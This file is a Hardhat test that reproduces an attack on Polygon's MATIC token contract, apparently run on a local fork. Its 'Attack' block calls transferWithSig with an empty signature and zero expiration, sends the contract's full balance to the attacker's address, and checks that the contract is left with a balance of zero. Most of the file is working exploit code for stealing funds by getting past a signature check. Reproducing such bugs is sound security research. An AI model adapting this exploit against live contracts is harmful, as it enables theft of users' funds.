const { expect } = require("chai");
const { providers } = require("ethers");
const { ethers } = require("hardhat");

// We just need to use this 2 functions.
const ABI = [
  "function balanceOf(address account) external view returns (uint256)",
  "function transferWithSig(bytes sig,uint256 amount,bytes32 data,uint256 expiration,address to) external",
];
const MATIC_ADDRESS = "0x0000000000000000000000000000000000001010";

describe("Polygon Bug", () => {
  let attacker;
  let matic;
  let initialBalance;

  beforeEach(async () => {
    [attacker] = await ethers.getSigners();
    matic = await ethers.getContractAt(ABI, MATIC_ADDRESS);
    initialBalance = "9999990277519733791050831370";
  });

  describe("Pre-checks", () => {
    it("matic address should have a lot of matic", async () => {
      const bal = await ethers.provider.getBalance(MATIC_ADDRESS);
      expect(bal).to.equal(initialBalance);
    });
  });

  describe("Attack", () => {
    it("should drain all of matic tokens", async () => {
      const attackerInitialBalance = await ethers.provider.getBalance(
        attacker.address
      );
      console.log(
        `Attacker initial balance: ${ethers.utils.formatEther(
          attackerInitialBalance
        )} MATIC`
      );
      const sig = "0x";
      const amount = initialBalance; // We will transfer all the funds.
      const data =
        "0x0000000000000000000000000000000000000000000000000000000000000000"; // 32 bytes
      const expiration = 0;
      const to = attacker.address;
      await matic.transferWithSig(sig, amount, data, expiration, to); // We execute the transaction.

      // Check post balance.
      const attackerPostBalance = await ethers.provider.getBalance(
        attacker.address
      );
      console.log(
        `Attacker post balance: ${ethers.utils.formatEther(
          attackerPostBalance
        )} MATIC`
      );

      // Matic contract should have 0 balance. 
      const maticBalance = await ethers.provider.getBalance(MATIC_ADDRESS);
      expect(maticBalance).to.equal(0);
    });
  });
});
